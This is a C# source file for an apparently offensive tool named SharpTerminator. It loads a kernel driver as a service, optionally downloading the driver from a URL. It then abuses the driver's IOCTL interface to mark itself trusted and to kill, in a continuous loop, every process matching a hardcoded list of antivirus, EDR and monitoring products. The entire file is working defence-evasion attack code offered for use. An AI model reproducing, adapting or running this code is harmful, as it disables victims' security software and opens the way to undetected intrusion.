using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

class Program
{
    const uint IOCTL_REGISTER_PROCESS = 0x80002010;
    const uint IOCTL_TERMINATE_PROCESS = 0x80002048;

    static readonly string[] edrList = {
        "activeconsole", "anti malware", "anti-malware",
        "antimalware", "anti virus", "anti-virus",
        "antivirus", "appsense", "authtap",
        "avast", "avecto", "canary",
        "carbonblack", "carbon black", "cb.exe",
        "ciscoamp", "cisco amp", "countercept",
        "countertack", "cramtray", "crssvc",
        "crowdstrike", "csagent", "csfalcon",
        "csshell", "cybereason", "cyclorama",
        "cylance", "cyoptics", "cyupdate",
        "cyvera", "cyserver", "cytray",
        "darktrace", "defendpoint", "defender",
        "eectrl", "elastic", "endgame",
        "f-secure", "forcepoint", "fireeye",
        "groundling", "GRRservic", "inspector",
        "ivanti", "kaspersky", "lacuna",
        "logrhythm", "malware", "mandiant",
        "mcafee", "morphisec", "msascuil",
        "msmpeng", "nissrv", "omni",
        "omniagent", "osquery", "palo alto networks",
        "pgeposervice", "pgsystemtray", "privilegeguard",
        "procwall", "protectorservic", "qradar",
        "redcloak", "secureworks", "securityhealthservice",
        "semlaunchsv", "sentinel", "sepliveupdat",
        "sisidsservice", "sisipsservice", "sisipsutil",
        "smc.exe", "smcgui", "snac64",
        "sophos", "splunk", "srtsp",
        "symantec", "symcorpu", "symefasi",
        "sysinternal", "sysmon", "tanium",
        "tda.exe", "tdawork", "tpython",
        "vectra", "wincollect", "windowssensor",
        "wireshark", "threat", "xagt.exe",
        "xagtnotif.exe", "mssense"
    };

    static bool LoadDriver(string driverPath)
    {
        IntPtr hSCM = NativeMethods.OpenSCManager(null, null, NativeMethods.ServiceManagerAccess.SC_MANAGER_ALL_ACCESS);
        if (hSCM == IntPtr.Zero)
            return false;

        IntPtr hService = NativeMethods.OpenService(hSCM, "Terminator", NativeMethods.ServiceAccess.SERVICE_ALL_ACCESS);
        if (hService != IntPtr.Zero)
        {
            Console.WriteLine("Service already exists.");
            NativeMethods.CloseServiceHandle(hService);
            NativeMethods.CloseServiceHandle(hSCM);
            return true;
        }

        hService = NativeMethods.CreateService(
            hSCM,
            "Terminator",
            "Terminator",
            NativeMethods.ServiceAccess.SERVICE_ALL_ACCESS,
            NativeMethods.ServiceType.SERVICE_KERNEL_DRIVER,
            NativeMethods.ServiceStartType.SERVICE_DEMAND_START,
            NativeMethods.ServiceErrorControl.SERVICE_ERROR_IGNORE,
            driverPath,
            null,
            IntPtr.Zero,
            null,
            null,
            null);

        if (hService == IntPtr.Zero)
        {
            NativeMethods.CloseServiceHandle(hSCM);
            return false;
        }

        NativeMethods.CloseServiceHandle(hService);
        NativeMethods.CloseServiceHandle(hSCM);
        return true;
    }

    static bool LoadDriverFromUrl(string driverUrl)
    {
        WebClient webClient = new WebClient();
        string driverFileName = Path.GetFileName(driverUrl);
        string driverPath = Path.Combine(@"C:\Windows\Temp", driverFileName);

        try
        {
            webClient.DownloadFile(driverUrl, driverPath);
            return LoadDriver(driverPath);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Failed to download and load the driver: " + ex.Message);
            return false;
        }
    }


    static bool IsInEdrList(string processName)
    {
        string lowerProcessName = processName.ToLower();
        for (int i = 0; i < edrList.Length; i++)
        {
            if (lowerProcessName.Contains(edrList[i]))
                return true;
        }
        return false;
    }

    static int CheckEDRProcesses(IntPtr hDevice)
    {
        uint procId = 0;
        uint pOutbuff = 0;
        int ecount = 0;
        NativeMethods.PROCESSENTRY32 pE = new NativeMethods.PROCESSENTRY32();
        pE.dwSize = (uint)Marshal.SizeOf(typeof(NativeMethods.PROCESSENTRY32));

        IntPtr hSnap = NativeMethods.CreateToolhelp32Snapshot(NativeMethods.SnapshotFlags.TH32CS_SNAPPROCESS, 0);

        if (hSnap != IntPtr.Zero)
        {
            if (NativeMethods.Process32First(hSnap, ref pE))
            {
                do
                {
                    string exeName = pE.szExeFile;
                    if (IsInEdrList(exeName))
                    {
                        procId = pE.th32ProcessID;
                        if (!NativeMethods.DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, ref procId,
                            sizeof(uint), IntPtr.Zero, 0,
                            out _, IntPtr.Zero))
                        {
                            Console.WriteLine("Failed to terminate {0}!!", exeName);
                        }
                        else
                        {
                            Console.WriteLine("Terminated {0}", exeName);
                            ecount++;
                        }
                    }
                } while (NativeMethods.Process32Next(hSnap, ref pE));
            }
            NativeMethods.CloseHandle(hSnap);
        }
        return ecount;
    }

    static bool StartService(string serviceName)
    {
        try
        {
            Process.Start("sc", $"start {serviceName}");
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine("Failed to start the service: " + ex.Message);
            return false;
        }
    }

    static void Main(string[] args)
    {
        if (args.Length < 2)
        {
            Console.WriteLine("Invalid arguments!");
            Console.WriteLine("Usage: SharpTerminator.exe --url <driverUrl> or SharpTerminator.exe --disk <driverPath>");
            return;
        }

        string argType = args[0].ToLower();
        string driverArg = args[1];

        if (argType == "--url")
        {
            Console.WriteLine("Loading driver from URL: " + driverArg);
            if (!LoadDriverFromUrl(driverArg))
            {
                Console.WriteLine("Failed to download and load the driver from URL.");
                return;
            }
        }
        else if (argType == "--disk")
        {
            Console.WriteLine("Loading driver from disk: " + driverArg);
            if (!LoadDriver(driverArg))
            {
                Console.WriteLine("Failed to load the driver from disk.");
                return;
            }
        }
        else
        {
            Console.WriteLine("Invalid argument type!");
            Console.WriteLine("Usage: SharpTerminator.exe --url <driverUrl> or SharpTerminator.exe --disk <driverPath>");
            return;
        }

        Console.WriteLine("Driver loaded successfully!");

        int startServiceDelayMilliseconds = 2000; 
        int registerProcessDelayMilliseconds = 3000; 

        if (!StartService("Terminator"))
        {
            Console.WriteLine("Failed to start the service.");
            return;
        }

        Console.WriteLine("Service started successfully!");

        Console.WriteLine("Waiting for {0} milliseconds after starting the service...", startServiceDelayMilliseconds);
        Thread.Sleep(startServiceDelayMilliseconds);

        IntPtr hDevice = NativeMethods.CreateFile(
            @"\\.\\ZemanaAntiMalware",
            NativeMethods.GenericAccess.GENERIC_WRITE | NativeMethods.GenericAccess.GENERIC_READ,
            NativeMethods.FileShare.FILE_SHARE_READ | NativeMethods.FileShare.FILE_SHARE_WRITE,
            IntPtr.Zero,
            NativeMethods.FileMode.OPEN_EXISTING,
            NativeMethods.FileFlagsAndAttributes.FILE_ATTRIBUTE_NORMAL,
            IntPtr.Zero);

        if (hDevice == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open handle to driver!");
            return;
        }

        Console.WriteLine("Waiting for {0} milliseconds after opening handle to driver...", startServiceDelayMilliseconds);
        Thread.Sleep(startServiceDelayMilliseconds);

        uint input = (uint)Process.GetCurrentProcess().Id;

        if (!NativeMethods.DeviceIoControl(hDevice, IOCTL_REGISTER_PROCESS, ref input, sizeof(uint),
            IntPtr.Zero, 0, out _, IntPtr.Zero))
        {
            Console.WriteLine("Failed to register the process in the trusted list!");
            return;
        }

        Console.WriteLine("Process registered in the trusted list!");

        Console.WriteLine("Waiting for {0} milliseconds after registering the process...", registerProcessDelayMilliseconds);
        Thread.Sleep(registerProcessDelayMilliseconds);

        Console.WriteLine("Terminating ALL EDR/XDR/AVs ..");
        Console.WriteLine("Keep the program running to prevent Windows services from restarting them");

        while (true)
        {
            int edrProcessCount = CheckEDRProcesses(hDevice);
            if (edrProcessCount == 0)
                Thread.Sleep(1200);
            else
                Thread.Sleep(700);
        }
    }
    class NativeMethods
    {
        public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(
            string machineName,
            string databaseName,
            ServiceManagerAccess desiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenService(
            IntPtr hSCManager,
            string lpServiceName,
            ServiceAccess dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CloseServiceHandle(IntPtr hSCObject);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateService(
            IntPtr hSCManager,
            string lpServiceName,
            string lpDisplayName,
            ServiceAccess dwDesiredAccess,
            ServiceType dwServiceType,
            ServiceStartType dwStartType,
            ServiceErrorControl dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            IntPtr lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateFile(
            string lpFileName,
            GenericAccess dwDesiredAccess,
            FileShare dwShareMode,
            IntPtr lpSecurityAttributes,
            FileMode dwCreationDisposition,
            FileFlagsAndAttributes dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            ref uint lpInBuffer,
            int nInBufferSize,
            IntPtr lpOutBuffer,
            int nOutBufferSize,
            out int lpBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateToolhelp32Snapshot(
            SnapshotFlags dwFlags,
            uint th32ProcessID);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool Process32First(
            IntPtr hSnapshot,
            ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool Process32Next(
            IntPtr hSnapshot,
            ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CloseHandle(
            IntPtr hObject);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct PROCESSENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExeFile;
        }

        [Flags]
        public enum GenericAccess : uint
        {
            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000
        }

        [Flags]
        public enum FileShare : uint
        {
            FILE_SHARE_READ = 0x1,
            FILE_SHARE_WRITE = 0x2,
            FILE_SHARE_DELETE = 0x4
        }

        public enum FileMode : uint
        {
            CREATE_NEW = 1,
            CREATE_ALWAYS = 2,
            OPEN_EXISTING = 3,
            OPEN_ALWAYS = 4,
            TRUNCATE_EXISTING = 5
        }

        [Flags]
        public enum FileFlagsAndAttributes : uint
        {
            FILE_ATTRIBUTE_NORMAL = 0x80,
        }

        [Flags]
        public enum SnapshotFlags : uint
        {
            TH32CS_SNAPPROCESS = 0x00000002
        }

        [Flags]
        public enum ServiceManagerAccess : uint
        {
            SC_MANAGER_ALL_ACCESS = 0xF003F
        }

        [Flags]
        public enum ServiceAccess : uint
        {
            SERVICE_ALL_ACCESS = 0xF01FF
        }

        public enum ServiceType : uint
        {
            SERVICE_KERNEL_DRIVER = 0x00000001,
            SERVICE_FILE_SYSTEM_DRIVER = 0x00000002
        }

        public enum ServiceStartType : uint
        {
            SERVICE_BOOT_START = 0x00000000,
            SERVICE_SYSTEM_START = 0x00000001,
            SERVICE_AUTO_START = 0x00000002,
            SERVICE_DEMAND_START = 0x00000003,
            SERVICE_DISABLED = 0x00000004
        }

        public enum ServiceErrorControl : uint
        {
            SERVICE_ERROR_IGNORE = 0x00000000,
            SERVICE_ERROR_NORMAL = 0x00000001,
            SERVICE_ERROR_SEVERE = 0x00000002,
            SERVICE_ERROR_CRITICAL = 0x00000003
        }

        public enum ServiceState : uint
        {
            SERVICE_STOPPED = 0x00000001,
            SERVICE_START_PENDING = 0x00000002,
            SERVICE_STOP_PENDING = 0x00000003,
            SERVICE_RUNNING = 0x00000004,
            SERVICE_CONTINUE_PENDING = 0x00000005,
            SERVICE_PAUSE_PENDING = 0x00000006,
            SERVICE_PAUSED = 0x00000007
        }
    }
}
